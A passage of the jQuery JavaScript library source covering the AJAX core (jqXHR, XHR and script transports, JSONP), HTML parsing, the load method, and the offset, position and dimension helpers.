        completed,

        // To know if global events are to be dispatched
        fireGlobals,

        // Loop variable
        i,

        // uncached part of the url
        uncached,

        // Create the final options object
        s = jQuery.ajaxSetup( {}, options ),

        // Callbacks context
        callbackContext = s.context || s,

        // Context for global events is callbackContext if it is a DOM node or jQuery collection
        globalEventContext = s.context &&
            ( callbackContext.nodeType || callbackContext.jquery ) ?
            jQuery( callbackContext ) :
            jQuery.event,

        // Deferreds
        deferred = jQuery.Deferred(),
        completeDeferred = jQuery.Callbacks( "once memory" ),

        // Status-dependent callbacks
        statusCode = s.statusCode || {},

        // Headers (they are sent all at once)
        requestHeaders = {},
        requestHeadersNames = {},

        // Default abort message
        strAbort = "canceled",

        // Fake xhr
        jqXHR = {
            readyState: 0,

            // Builds headers hashtable if needed
            getResponseHeader: function( key ) {
                var match;
                if ( completed ) {
                    if ( !responseHeaders ) {
                        responseHeaders = {};
                        while ( ( match = rheaders.exec( responseHeadersString ) ) ) {
                            responseHeaders[ match[ 1 ].toLowerCase() + " " ] =
                                ( responseHeaders[ match[ 1 ].toLowerCase() + " " ] || [] )
                                    .concat( match[ 2 ] );
                        }
                    }
                    match = responseHeaders[ key.toLowerCase() + " " ];
                }
                return match == null ? null : match.join( ", " );
            },

            // Raw string
            getAllResponseHeaders: function() {
                return completed ? responseHeadersString : null;
            },

            // Caches the header
            setRequestHeader: function( name, value ) {
                if ( completed == null ) {
                    name = requestHeadersNames[ name.toLowerCase() ] =
                        requestHeadersNames[ name.toLowerCase() ] || name;
                    requestHeaders[ name ] = value;
                }
                return this;
            },

            // Overrides response content-type header
            overrideMimeType: function( type ) {
                if ( completed == null ) {
                    s.mimeType = type;
                }
                return this;
            },

            // Status-dependent callbacks
            statusCode: function( map ) {
                var code;
                if ( map ) {
                    if ( completed ) {

                        // Execute the appropriate callbacks
                        jqXHR.always( map[ jqXHR.status ] );
                    } else {

                        // Lazy-add the new callbacks in a way that preserves old ones
                        for ( code in map ) {
                            statusCode[ code ] = [ statusCode[ code ], map[ code ] ];
                        }
                    }
                }
                return this;
            },

            // Cancel the request
            abort: function( statusText ) {
                var finalText = statusText || strAbort;
                if ( transport ) {
                    transport.abort( finalText );
                }
                done( 0, finalText );
                return this;
            }
        };

    // Attach deferreds
    deferred.promise( jqXHR );

    // Add protocol if not provided (prefilters might expect it)
    // Handle falsy url in the settings object (#10093: consistency with old signature)
    // We also use the url parameter if available
    s.url = ( ( url || s.url || location.href ) + "" )
        .replace( rprotocol, location.protocol + "//" );

    // Alias method option to type as per ticket #12004
    s.type = options.method || options.type || s.method || s.type;

    // Extract dataTypes list
    s.dataTypes = ( s.dataType || "*" ).toLowerCase().match( rnothtmlwhite ) || [ "" ];

    // A cross-domain request is in order when the origin doesn't match the current origin.
    if ( s.crossDomain == null ) {
        urlAnchor = document.createElement( "a" );

        // Support: IE <=8 - 11, Edge 12 - 15
        // IE throws exception on accessing the href property if url is malformed,
        // e.g. http://example.com:80x/
        try {
            urlAnchor.href = s.url;

            // Support: IE <=8 - 11 only
            // Anchor's host property isn't correctly set when s.url is relative
            urlAnchor.href = urlAnchor.href;
            s.crossDomain = originAnchor.protocol + "//" + originAnchor.host !==
                urlAnchor.protocol + "//" + urlAnchor.host;
        } catch ( e ) {

            // If there is an error parsing the URL, assume it is crossDomain,
            // it can be rejected by the transport if it is invalid
            s.crossDomain = true;
        }
    }

    // Convert data if not already a string
    if ( s.data && s.processData && typeof s.data !== "string" ) {
        s.data = jQuery.param( s.data, s.traditional );
    }

    // Apply prefilters
    inspectPrefiltersOrTransports( prefilters, s, options, jqXHR );

    // If request was aborted inside a prefilter, stop there
    if ( completed ) {
        return jqXHR;
    }

    // We can fire global events as of now if asked to
    // Don't fire events if jQuery.event is undefined in an AMD-usage scenario (#15118)
    fireGlobals = jQuery.event && s.global;

    // Watch for a new set of requests
    if ( fireGlobals && jQuery.active++ === 0 ) {
        jQuery.event.trigger( "ajaxStart" );
    }

    // Uppercase the type
    s.type = s.type.toUpperCase();

    // Determine if request has content
    s.hasContent = !rnoContent.test( s.type );

    // Save the URL in case we're toying with the If-Modified-Since
    // and/or If-None-Match header later on
    // Remove hash to simplify url manipulation
    cacheURL = s.url.replace( rhash, "" );

    // More options handling for requests with no content
    if ( !s.hasContent ) {

        // Remember the hash so we can put it back
        uncached = s.url.slice( cacheURL.length );

        // If data is available and should be processed, append data to url
        if ( s.data && ( s.processData || typeof s.data === "string" ) ) {
            cacheURL += ( rquery.test( cacheURL ) ? "&" : "?" ) + s.data;

            // #9682: remove data so that it's not used in an eventual retry
            delete s.data;
        }

        // Add or update anti-cache param if needed
        if ( s.cache === false ) {
            cacheURL = cacheURL.replace( rantiCache, "$1" );
            uncached = ( rquery.test( cacheURL ) ? "&" : "?" ) + "_=" + ( nonce.guid++ ) +
                uncached;
        }

        // Put hash and anti-cache on the URL that will be requested (gh-1732)
        s.url = cacheURL + uncached;

    // Change '%20' to '+' if this is encoded form body content (gh-2658)
    } else if ( s.data && s.processData &&
        ( s.contentType || "" ).indexOf( "application/x-www-form-urlencoded" ) === 0 ) {
        s.data = s.data.replace( r20, "+" );
    }

    // Set the If-Modified-Since and/or If-None-Match header, if in ifModified mode.
    if ( s.ifModified ) {
        if ( jQuery.lastModified[ cacheURL ] ) {
            jqXHR.setRequestHeader( "If-Modified-Since", jQuery.lastModified[ cacheURL ] );
        }
        if ( jQuery.etag[ cacheURL ] ) {
            jqXHR.setRequestHeader( "If-None-Match", jQuery.etag[ cacheURL ] );
        }
    }

    // Set the correct header, if data is being sent
    if ( s.data && s.hasContent && s.contentType !== false || options.contentType ) {
        jqXHR.setRequestHeader( "Content-Type", s.contentType );
    }

    // Set the Accepts header for the server, depending on the dataType
    jqXHR.setRequestHeader(
        "Accept",
        s.dataTypes[ 0 ] && s.accepts[ s.dataTypes[ 0 ] ] ?
            s.accepts[ s.dataTypes[ 0 ] ] +
                ( s.dataTypes[ 0 ] !== "*" ? ", " + allTypes + "; q=0.01" : "" ) :
            s.accepts[ "*" ]
    );

    // Check for headers option
    for ( i in s.headers ) {
        jqXHR.setRequestHeader( i, s.headers[ i ] );
    }

    // Allow custom headers/mimetypes and early abort
    if ( s.beforeSend &&
        ( s.beforeSend.call( callbackContext, jqXHR, s ) === false || completed ) ) {

        // Abort if not done already and return
        return jqXHR.abort();
    }

    // Aborting is no longer a cancellation
    strAbort = "abort";

    // Install callbacks on deferreds
    completeDeferred.add( s.complete );
    jqXHR.done( s.success );
    jqXHR.fail( s.error );

    // Get transport
    transport = inspectPrefiltersOrTransports( transports, s, options, jqXHR );

    // If no transport, we auto-abort
    if ( !transport ) {
        done( -1, "No Transport" );
    } else {
        jqXHR.readyState = 1;

        // Send global event
        if ( fireGlobals ) {
            globalEventContext.trigger( "ajaxSend", [ jqXHR, s ] );
        }

        // If request was aborted inside ajaxSend, stop there
        if ( completed ) {
            return jqXHR;
        }

        // Timeout
        if ( s.async && s.timeout > 0 ) {
            timeoutTimer = window.setTimeout( function() {
                jqXHR.abort( "timeout" );
            }, s.timeout );
        }

        try {
            completed = false;
            transport.send( requestHeaders, done );
        } catch ( e ) {

            // Rethrow post-completion exceptions
            if ( completed ) {
                throw e;
            }

            // Propagate others as results
            done( -1, e );
        }
    }

    // Callback for when everything is done
    function done( status, nativeStatusText, responses, headers ) {
        var isSuccess, success, error, response, modified,
            statusText = nativeStatusText;

        // Ignore repeat invocations
        if ( completed ) {
            return;
        }

        completed = true;

        // Clear timeout if it exists
        if ( timeoutTimer ) {
            window.clearTimeout( timeoutTimer );
        }

        // Dereference transport for early garbage collection
        // (no matter how long the jqXHR object will be used)
        transport = undefined;

        // Cache response headers
        responseHeadersString = headers || "";

        // Set readyState
        jqXHR.readyState = status > 0 ? 4 : 0;

        // Determine if successful
        isSuccess = status >= 200 && status < 300 || status === 304;

        // Get response data
        if ( responses ) {
            response = ajaxHandleResponses( s, jqXHR, responses );
        }

        // Use a noop converter for missing script but not if jsonp
        if ( !isSuccess &&
            jQuery.inArray( "script", s.dataTypes ) > -1 &&
            jQuery.inArray( "json", s.dataTypes ) < 0 ) {
            s.converters[ "text script" ] = function() {};
        }

        // Convert no matter what (that way responseXXX fields are always set)
        response = ajaxConvert( s, response, jqXHR, isSuccess );

        // If successful, handle type chaining
        if ( isSuccess ) {

            // Set the If-Modified-Since and/or If-None-Match header, if in ifModified mode.
            if ( s.ifModified ) {
                modified = jqXHR.getResponseHeader( "Last-Modified" );
                if ( modified ) {
                    jQuery.lastModified[ cacheURL ] = modified;
                }
                modified = jqXHR.getResponseHeader( "etag" );
                if ( modified ) {
                    jQuery.etag[ cacheURL ] = modified;
                }
            }

            // if no content
            if ( status === 204 || s.type === "HEAD" ) {
                statusText = "nocontent";

            // if not modified
            } else if ( status === 304 ) {
                statusText = "notmodified";

            // If we have data, let's convert it
            } else {
                statusText = response.state;
                success = response.data;
                error = response.error;
                isSuccess = !error;
            }
        } else {

            // Extract error from statusText and normalize for non-aborts
            error = statusText;
            if ( status || !statusText ) {
                statusText = "error";
                if ( status < 0 ) {
                    status = 0;
                }
            }
        }

        // Set data for the fake xhr object
        jqXHR.status = status;
        jqXHR.statusText = ( nativeStatusText || statusText ) + "";

        // Success/Error
        if ( isSuccess ) {
            deferred.resolveWith( callbackContext, [ success, statusText, jqXHR ] );
        } else {
            deferred.rejectWith( callbackContext, [ jqXHR, statusText, error ] );
        }

        // Status-dependent callbacks
        jqXHR.statusCode( statusCode );
        statusCode = undefined;

        if ( fireGlobals ) {
            globalEventContext.trigger( isSuccess ? "ajaxSuccess" : "ajaxError",
                [ jqXHR, s, isSuccess ? success : error ] );
        }

        // Complete
        completeDeferred.fireWith( callbackContext, [ jqXHR, statusText ] );

        if ( fireGlobals ) {
            globalEventContext.trigger( "ajaxComplete", [ jqXHR, s ] );

            // Handle the global AJAX counter
            if ( !( --jQuery.active ) ) {
                jQuery.event.trigger( "ajaxStop" );
            }
        }
    }

    return jqXHR;
},

getJSON: function( url, data, callback ) {
    return jQuery.get( url, data, callback, "json" );
},

getScript: function( url, callback ) {
    return jQuery.get( url, undefined, callback, "script" );
}
} );

jQuery.each( [ "get", "post" ], function( _i, method ) {
jQuery[ method ] = function( url, data, callback, type ) {

    // Shift arguments if data argument was omitted
    if ( isFunction( data ) ) {
        type = type || callback;
        callback = data;
        data = undefined;
    }

    // The url can be an options object (which then must have .url)
    return jQuery.ajax( jQuery.extend( {
        url: url,
        type: method,
        dataType: type,
        data: data,
        success: callback
    }, jQuery.isPlainObject( url ) && url ) );
};
} );

jQuery.ajaxPrefilter( function( s ) {
var i;
for ( i in s.headers ) {
    if ( i.toLowerCase() === "content-type" ) {
        s.contentType = s.headers[ i ] || "";
    }
}
} );


jQuery._evalUrl = function( url, options, doc ) {
return jQuery.ajax( {
    url: url,

    // Make this explicit, since user can override this through ajaxSetup (#11264)
    type: "GET",
    dataType: "script",
    cache: true,
    async: false,
    global: false,

    // Only evaluate the response if it is successful (gh-4126)
    // dataFilter is not invoked for failure responses, so using it instead
    // of the default converter is kludgy but it works.
    converters: {
        "text script": function() {}
    },
    dataFilter: function( response ) {
        jQuery.globalEval( response, options, doc );
    }
} );
};


jQuery.fn.extend( {
wrapAll: function( html ) {
    var wrap;

    if ( this[ 0 ] ) {
        if ( isFunction( html ) ) {
            html = html.call( this[ 0 ] );
        }

        // The elements to wrap the target around
        wrap = jQuery( html, this[ 0 ].ownerDocument ).eq( 0 ).clone( true );

        if ( this[ 0 ].parentNode ) {
            wrap.insertBefore( this[ 0 ] );
        }

        wrap.map( function() {
            var elem = this;

            while ( elem.firstElementChild ) {
                elem = elem.firstElementChild;
            }

            return elem;
        } ).append( this );
    }

    return this;
},

wrapInner: function( html ) {
    if ( isFunction( html ) ) {
        return this.each( function( i ) {
            jQuery( this ).wrapInner( html.call( this, i ) );
        } );
    }

    return this.each( function() {
        var self = jQuery( this ),
            contents = self.contents();

        if ( contents.length ) {
            contents.wrapAll( html );

        } else {
            self.append( html );
        }
    } );
},

wrap: function( html ) {
    var htmlIsFunction = isFunction( html );

    return this.each( function( i ) {
        jQuery( this ).wrapAll( htmlIsFunction ? html.call( this, i ) : html );
    } );
},

unwrap: function( selector ) {
    this.parent( selector ).not( "body" ).each( function() {
        jQuery( this ).replaceWith( this.childNodes );
    } );
    return this;
}
} );


jQuery.expr.pseudos.hidden = function( elem ) {
return !jQuery.expr.pseudos.visible( elem );
};
jQuery.expr.pseudos.visible = function( elem ) {
return !!( elem.offsetWidth || elem.offsetHeight || elem.getClientRects().length );
};




jQuery.ajaxSettings.xhr = function() {
try {
    return new window.XMLHttpRequest();
} catch ( e ) {}
};

var xhrSuccessStatus = {

    // File protocol always yields status code 0, assume 200
    0: 200,

    // Support: IE <=9 only
    // #1450: sometimes IE returns 1223 when it should be 204
    1223: 204
},
xhrSupported = jQuery.ajaxSettings.xhr();

support.cors = !!xhrSupported && ( "withCredentials" in xhrSupported );
support.ajax = xhrSupported = !!xhrSupported;

jQuery.ajaxTransport( function( options ) {
var callback, errorCallback;

// Cross domain only allowed if supported through XMLHttpRequest
if ( support.cors || xhrSupported && !options.crossDomain ) {
    return {
        send: function( headers, complete ) {
            var i,
                xhr = options.xhr();

            xhr.open(
                options.type,
                options.url,
                options.async,
                options.username,
                options.password
            );

            // Apply custom fields if provided
            if ( options.xhrFields ) {
                for ( i in options.xhrFields ) {
                    xhr[ i ] = options.xhrFields[ i ];
                }
            }

            // Override mime type if needed
            if ( options.mimeType && xhr.overrideMimeType ) {
                xhr.overrideMimeType( options.mimeType );
            }

            // X-Requested-With header
            // For cross-domain requests, seeing as conditions for a preflight are
            // akin to a jigsaw puzzle, we simply never set it to be sure.
            // (it can always be set on a per-request basis or even using ajaxSetup)
            // For same-domain requests, won't change header if already provided.
            if ( !options.crossDomain && !headers[ "X-Requested-With" ] ) {
                headers[ "X-Requested-With" ] = "XMLHttpRequest";
            }

            // Set headers
            for ( i in headers ) {
                xhr.setRequestHeader( i, headers[ i ] );
            }

            // Callback
            callback = function( type ) {
                return function() {
                    if ( callback ) {
                        callback = errorCallback = xhr.onload =
                            xhr.onerror = xhr.onabort = xhr.ontimeout =
                                xhr.onreadystatechange = null;

                        if ( type === "abort" ) {
                            xhr.abort();
                        } else if ( type === "error" ) {

                            // Support: IE <=9 only
                            // On a manual native abort, IE9 throws
                            // errors on any property access that is not readyState
                            if ( typeof xhr.status !== "number" ) {
                                complete( 0, "error" );
                            } else {
                                complete(

                                    // File: protocol always yields status 0; see #8605, #14207
                                    xhr.status,
                                    xhr.statusText
                                );
                            }
                        } else {
                            complete(
                                xhrSuccessStatus[ xhr.status ] || xhr.status,
                                xhr.statusText,

                                // Support: IE <=9 only
                                // IE9 has no XHR2 but throws on binary (trac-11426)
                                // For XHR2 non-text, let the caller handle it (gh-2498)
                                ( xhr.responseType || "text" ) !== "text"  ||
                                typeof xhr.responseText !== "string" ?
                                    { binary: xhr.response } :
                                    { text: xhr.responseText },
                                xhr.getAllResponseHeaders()
                            );
                        }
                    }
                };
            };

            // Listen to events
            xhr.onload = callback();
            errorCallback = xhr.onerror = xhr.ontimeout = callback( "error" );

            // Support: IE 9 only
            // Use onreadystatechange to replace onabort
            // to handle uncaught aborts
            if ( xhr.onabort !== undefined ) {
                xhr.onabort = errorCallback;
            } else {
                xhr.onreadystatechange = function() {

                    // Check readyState before timeout as it changes
                    if ( xhr.readyState === 4 ) {

                        // Allow onerror to be called first,
                        // but that will not handle a native abort
                        // Also, save errorCallback to a variable
                        // as xhr.onerror cannot be accessed
                        window.setTimeout( function() {
                            if ( callback ) {
                                errorCallback();
                            }
                        } );
                    }
                };
            }

            // Create the abort callback
            callback = callback( "abort" );

            try {

                // Do send the request (this may raise an exception)
                xhr.send( options.hasContent && options.data || null );
            } catch ( e ) {

                // #14683: Only rethrow if this hasn't been notified as an error yet
                if ( callback ) {
                    throw e;
                }
            }
        },

        abort: function() {
            if ( callback ) {
                callback();
            }
        }
    };
}
} );




// Prevent auto-execution of scripts when no explicit dataType was provided (See gh-2432)
jQuery.ajaxPrefilter( function( s ) {
if ( s.crossDomain ) {
    s.contents.script = false;
}
} );

// Install script dataType
jQuery.ajaxSetup( {
accepts: {
    script: "text/javascript, application/javascript, " +
        "application/ecmascript, application/x-ecmascript"
},
contents: {
    script: /\b(?:java|ecma)script\b/
},
converters: {
    "text script": function( text ) {
        jQuery.globalEval( text );
        return text;
    }
}
} );

// Handle cache's special case and crossDomain
jQuery.ajaxPrefilter( "script", function( s ) {
if ( s.cache === undefined ) {
    s.cache = false;
}
if ( s.crossDomain ) {
    s.type = "GET";
}
} );

// Bind script tag hack transport
jQuery.ajaxTransport( "script", function( s ) {

// This transport only deals with cross domain or forced-by-attrs requests
if ( s.crossDomain || s.scriptAttrs ) {
    var script, callback;
    return {
        send: function( _, complete ) {
            script = jQuery( "<script>" )
                .attr( s.scriptAttrs || {} )
                .prop( { charset: s.scriptCharset, src: s.url } )
                .on( "load error", callback = function( evt ) {
                    script.remove();
                    callback = null;
                    if ( evt ) {
                        complete( evt.type === "error" ? 404 : 200, evt.type );
                    }
                } );

            // Use native DOM manipulation to avoid our domManip AJAX trickery
            document.head.appendChild( script[ 0 ] );
        },
        abort: function() {
            if ( callback ) {
                callback();
            }
        }
    };
}
} );




var oldCallbacks = [],
rjsonp = /(=)\?(?=&|$)|\?\?/;

// Default jsonp settings
jQuery.ajaxSetup( {
jsonp: "callback",
jsonpCallback: function() {
    var callback = oldCallbacks.pop() || ( jQuery.expando + "_" + ( nonce.guid++ ) );
    this[ callback ] = true;
    return callback;
}
} );

// Detect, normalize options and install callbacks for jsonp requests
jQuery.ajaxPrefilter( "json jsonp", function( s, originalSettings, jqXHR ) {

var callbackName, overwritten, responseContainer,
    jsonProp = s.jsonp !== false && ( rjsonp.test( s.url ) ?
        "url" :
        typeof s.data === "string" &&
            ( s.contentType || "" )
                .indexOf( "application/x-www-form-urlencoded" ) === 0 &&
            rjsonp.test( s.data ) && "data"
    );

// Handle iff the expected data type is "jsonp" or we have a parameter to set
if ( jsonProp || s.dataTypes[ 0 ] === "jsonp" ) {

    // Get callback name, remembering preexisting value associated with it
    callbackName = s.jsonpCallback = isFunction( s.jsonpCallback ) ?
        s.jsonpCallback() :
        s.jsonpCallback;

    // Insert callback into url or form data
    if ( jsonProp ) {
        s[ jsonProp ] = s[ jsonProp ].replace( rjsonp, "$1" + callbackName );
    } else if ( s.jsonp !== false ) {
        s.url += ( rquery.test( s.url ) ? "&" : "?" ) + s.jsonp + "=" + callbackName;
    }

    // Use data converter to retrieve json after script execution
    s.converters[ "script json" ] = function() {
        if ( !responseContainer ) {
            jQuery.error( callbackName + " was not called" );
        }
        return responseContainer[ 0 ];
    };

    // Force json dataType
    s.dataTypes[ 0 ] = "json";

    // Install callback
    overwritten = window[ callbackName ];
    window[ callbackName ] = function() {
        responseContainer = arguments;
    };

    // Clean-up function (fires after converters)
    jqXHR.always( function() {

        // If previous value didn't exist - remove it
        if ( overwritten === undefined ) {
            jQuery( window ).removeProp( callbackName );

        // Otherwise restore preexisting value
        } else {
            window[ callbackName ] = overwritten;
        }

        // Save back as free
        if ( s[ callbackName ] ) {

            // Make sure that re-using the options doesn't screw things around
            s.jsonpCallback = originalSettings.jsonpCallback;

            // Save the callback name for future use
            oldCallbacks.push( callbackName );
        }

        // Call if it was a function and we have a response
        if ( responseContainer && isFunction( overwritten ) ) {
            overwritten( responseContainer[ 0 ] );
        }

        responseContainer = overwritten = undefined;
    } );

    // Delegate to script
    return "script";
}
} );




// Support: Safari 8 only
// In Safari 8 documents created via document.implementation.createHTMLDocument
// collapse sibling forms: the second one becomes a child of the first one.
// Because of that, this security measure has to be disabled in Safari 8.
// https://bugs.webkit.org/show_bug.cgi?id=137337
support.createHTMLDocument = ( function() {
var body = document.implementation.createHTMLDocument( "" ).body;
body.innerHTML = "<form></form><form></form>";
return body.childNodes.length === 2;
} )();


// Argument "data" should be string of html
// context (optional): If specified, the fragment will be created in this context,
// defaults to document
// keepScripts (optional): If true, will include scripts passed in the html string
jQuery.parseHTML = function( data, context, keepScripts ) {
if ( typeof data !== "string" ) {
    return [];
}
if ( typeof context === "boolean" ) {
    keepScripts = context;
    context = false;
}

var base, parsed, scripts;

if ( !context ) {

    // Stop scripts or inline event handlers from being executed immediately
    // by using document.implementation
    if ( support.createHTMLDocument ) {
        context = document.implementation.createHTMLDocument( "" );

        // Set the base href for the created document
        // so any parsed elements with URLs
        // are based on the document's URL (gh-2965)
        base = context.createElement( "base" );
        base.href = document.location.href;
        context.head.appendChild( base );
    } else {
        context = document;
    }
}

parsed = rsingleTag.exec( data );
scripts = !keepScripts && [];

// Single tag
if ( parsed ) {
    return [ context.createElement( parsed[ 1 ] ) ];
}

parsed = buildFragment( [ data ], context, scripts );

if ( scripts && scripts.length ) {
    jQuery( scripts ).remove();
}

return jQuery.merge( [], parsed.childNodes );
};


/**
* Load a url into a page
*/
jQuery.fn.load = function( url, params, callback ) {
var selector, type, response,
    self = this,
    off = url.indexOf( " " );

if ( off > -1 ) {
    selector = stripAndCollapse( url.slice( off ) );
    url = url.slice( 0, off );
}

// If it's a function
if ( isFunction( params ) ) {

    // We assume that it's the callback
    callback = params;
    params = undefined;

// Otherwise, build a param string
} else if ( params && typeof params === "object" ) {
    type = "POST";
}

// If we have elements to modify, make the request
if ( self.length > 0 ) {
    jQuery.ajax( {
        url: url,

        // If "type" variable is undefined, then "GET" method will be used.
        // Make value of this field explicit since
        // user can override it through ajaxSetup method
        type: type || "GET",
        dataType: "html",
        data: params
    } ).done( function( responseText ) {

        // Save response for use in complete callback
        response = arguments;

        self.html( selector ?

            // If a selector was specified, locate the right elements in a dummy div
            // Exclude scripts to avoid IE 'Permission Denied' errors
            jQuery( "<div>" ).append( jQuery.parseHTML( responseText ) ).find( selector ) :

            // Otherwise use the full result
            responseText );

    // If the request succeeds, this function gets "data", "status", "jqXHR"
    // but they are ignored because response was set above.
    // If it fails, this function gets "jqXHR", "status", "error"
    } ).always( callback && function( jqXHR, status ) {
        self.each( function() {
            callback.apply( this, response || [ jqXHR.responseText, status, jqXHR ] );
        } );
    } );
}

return this;
};




jQuery.expr.pseudos.animated = function( elem ) {
return jQuery.grep( jQuery.timers, function( fn ) {
    return elem === fn.elem;
} ).length;
};




jQuery.offset = {
setOffset: function( elem, options, i ) {
    var curPosition, curLeft, curCSSTop, curTop, curOffset, curCSSLeft, calculatePosition,
        position = jQuery.css( elem, "position" ),
        curElem = jQuery( elem ),
        props = {};

    // Set position first, in-case top/left are set even on static elem
    if ( position === "static" ) {
        elem.style.position = "relative";
    }

    curOffset = curElem.offset();
    curCSSTop = jQuery.css( elem, "top" );
    curCSSLeft = jQuery.css( elem, "left" );
    calculatePosition = ( position === "absolute" || position === "fixed" ) &&
        ( curCSSTop + curCSSLeft ).indexOf( "auto" ) > -1;

    // Need to be able to calculate position if either
    // top or left is auto and position is either absolute or fixed
    if ( calculatePosition ) {
        curPosition = curElem.position();
        curTop = curPosition.top;
        curLeft = curPosition.left;

    } else {
        curTop = parseFloat( curCSSTop ) || 0;
        curLeft = parseFloat( curCSSLeft ) || 0;
    }

    if ( isFunction( options ) ) {

        // Use jQuery.extend here to allow modification of coordinates argument (gh-1848)
        options = options.call( elem, i, jQuery.extend( {}, curOffset ) );
    }

    if ( options.top != null ) {
        props.top = ( options.top - curOffset.top ) + curTop;
    }
    if ( options.left != null ) {
        props.left = ( options.left - curOffset.left ) + curLeft;
    }

    if ( "using" in options ) {
        options.using.call( elem, props );

    } else {
        curElem.css( props );
    }
}
};

jQuery.fn.extend( {

// offset() relates an element's border box to the document origin
offset: function( options ) {

    // Preserve chaining for setter
    if ( arguments.length ) {
        return options === undefined ?
            this :
            this.each( function( i ) {
                jQuery.offset.setOffset( this, options, i );
            } );
    }

    var rect, win,
        elem = this[ 0 ];

    if ( !elem ) {
        return;
    }

    // Return zeros for disconnected and hidden (display: none) elements (gh-2310)
    // Support: IE <=11 only
    // Running getBoundingClientRect on a
    // disconnected node in IE throws an error
    if ( !elem.getClientRects().length ) {
        return { top: 0, left: 0 };
    }

    // Get document-relative position by adding viewport scroll to viewport-relative gBCR
    rect = elem.getBoundingClientRect();
    win = elem.ownerDocument.defaultView;
    return {
        top: rect.top + win.pageYOffset,
        left: rect.left + win.pageXOffset
    };
},

// position() relates an element's margin box to its offset parent's padding box
// This corresponds to the behavior of CSS absolute positioning
position: function() {
    if ( !this[ 0 ] ) {
        return;
    }

    var offsetParent, offset, doc,
        elem = this[ 0 ],
        parentOffset = { top: 0, left: 0 };

    // position:fixed elements are offset from the viewport, which itself always has zero offset
    if ( jQuery.css( elem, "position" ) === "fixed" ) {

        // Assume position:fixed implies availability of getBoundingClientRect
        offset = elem.getBoundingClientRect();

    } else {
        offset = this.offset();

        // Account for the *real* offset parent, which can be the document or its root element
        // when a statically positioned element is identified
        doc = elem.ownerDocument;
        offsetParent = elem.offsetParent || doc.documentElement;
        while ( offsetParent &&
            ( offsetParent === doc.body || offsetParent === doc.documentElement ) &&
            jQuery.css( offsetParent, "position" ) === "static" ) {

            offsetParent = offsetParent.parentNode;
        }
        if ( offsetParent && offsetParent !== elem && offsetParent.nodeType === 1 ) {

            // Incorporate borders into its offset, since they are outside its content origin
            parentOffset = jQuery( offsetParent ).offset();
            parentOffset.top += jQuery.css( offsetParent, "borderTopWidth", true );
            parentOffset.left += jQuery.css( offsetParent, "borderLeftWidth", true );
        }
    }

    // Subtract parent offsets and element margins
    return {
        top: offset.top - parentOffset.top - jQuery.css( elem, "marginTop", true ),
        left: offset.left - parentOffset.left - jQuery.css( elem, "marginLeft", true )
    };
},

// This method will return documentElement in the following cases:
// 1) For the element inside the iframe without offsetParent, this method will return
//    documentElement of the parent window
// 2) For the hidden or detached element
// 3) For body or html element, i.e. in case of the html node - it will return itself
//
// but those exceptions were never presented as a real life use-cases
// and might be considered as more preferable results.
//
// This logic, however, is not guaranteed and can change at any point in the future
offsetParent: function() {
    return this.map( function() {
        var offsetParent = this.offsetParent;

        while ( offsetParent && jQuery.css( offsetParent, "position" ) === "static" ) {
            offsetParent = offsetParent.offsetParent;
        }

        return offsetParent || documentElement;
    } );
}
} );

// Create scrollLeft and scrollTop methods
jQuery.each( { scrollLeft: "pageXOffset", scrollTop: "pageYOffset" }, function( method, prop ) {
var top = "pageYOffset" === prop;

jQuery.fn[ method ] = function( val ) {
    return access( this, function( elem, method, val ) {

        // Coalesce documents and windows
        var win;
        if ( isWindow( elem ) ) {
            win = elem;
        } else if ( elem.nodeType === 9 ) {
            win = elem.defaultView;
        }

        if ( val === undefined ) {
            return win ? win[ prop ] : elem[ method ];
        }

        if ( win ) {
            win.scrollTo(
                !top ? val : win.pageXOffset,
                top ? val : win.pageYOffset
            );

        } else {
            elem[ method ] = val;
        }
    }, method, val, arguments.length );
};
} );

// Support: Safari <=7 - 9.1, Chrome <=37 - 49
// Add the top/left cssHooks using jQuery.fn.position
// Webkit bug: https://bugs.webkit.org/show_bug.cgi?id=29084
// Blink bug: https://bugs.chromium.org/p/chromium/issues/detail?id=589347
// getComputedStyle returns percent when specified for top/left/bottom/right;
// rather than make the css module depend on the offset module, just check for it here
jQuery.each( [ "top", "left" ], function( _i, prop ) {
jQuery.cssHooks[ prop ] = addGetHookIf( support.pixelPosition,
    function( elem, computed ) {
        if ( computed ) {
            computed = curCSS( elem, prop );

            // If curCSS returns percentage, fallback to offset
            return rnumnonpx.test( computed ) ?
                jQuery( elem ).position()[ prop ] + "px" :
                computed;
        }
    }
);
} );


// Create innerHeight, innerWidth, height, width, outerHeight and outerWidth methods
jQuery.each( { Height: "height", Width: "width" }, function( name, type ) {
jQuery.each( {
    padding: "inner" + name,
    content: type,
    "": "outer" + name
}, function( defaultExtra, funcName ) {

    // Margin is only for outerHeight, outerWidth
    jQuery.fn[ funcName ] = function( margin, value ) {
        var chainable = arguments.length && ( defaultExtra || typeof margin !== "boolean" ),
            extra = defaultExtra || ( margin === true || value === true ? "margin" : "border" );

        return access( this, function( elem, type, value ) {
            var doc;

            if ( isWindow( elem ) ) {

                // $( window ).outerWidth/Height return w/h including scrollbars (gh-1729)
                return funcName.indexOf( "outer" ) === 0 ?
                    elem[ "inner" + name ] :
                    elem.document.documentElement[ "client" + name ];
            }

            // Get document width or height
            if ( elem.nodeType === 9 ) {
                doc = elem.documentElement;

                // Either scroll[Width/Height] or offset[Width/Height] or client[Width/Height],
                // whichever is greatest
                return Math.max(
                    elem.body[ "scroll" + name ], doc[ "scroll" + name ],
                    elem.body[ "offset" + name ], doc[ "offset" + name ],
                    doc[ "client" + name ]
                );
            }

            return value === undefined ?

                // Get width or height on the element, requesting but not forcing parseFloat
                jQuery.css( elem, type, extra ) :

                // Set width or height on the element
                jQuery.style( elem, type, value, extra );
        }, type, chainable ? margin : undefined, chainable );
    };
} );
} );


jQuery.each( [
"ajaxStart",
"ajaxStop",
"ajaxComplete",
"ajaxError",
"ajaxSuccess",
"ajaxSend"
], function( _i, type ) {
jQuery.fn[ type ] = function( fn ) {
    return this.on( type, fn );
};
} );




jQuery.fn.extend( {

bind: function( types, data, fn ) {
    return this.on( types, null, data, fn );
},
unbind: function( types, fn ) {
    return this.off( types, null, fn );
},

delegate: function( selector, types, data, fn ) {
    return this.on( types, selector, data, fn );
},
undelegate: function( selector, types, fn ) {

    // ( namespace ) or ( selector, types [, fn] )
    return arguments.length === 1 ?
        this.off( selector, "**" ) :
        this.off( types, selector || "**", fn );
},

hover: function( fnOver, fnOut ) {
    return this.mouseenter( fnOver ).mouseleave( fnOut || fnOver );
}
} );

jQuery.each(
( "blur focus focusin focusout resize scroll click dblclick " +
"mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave " +
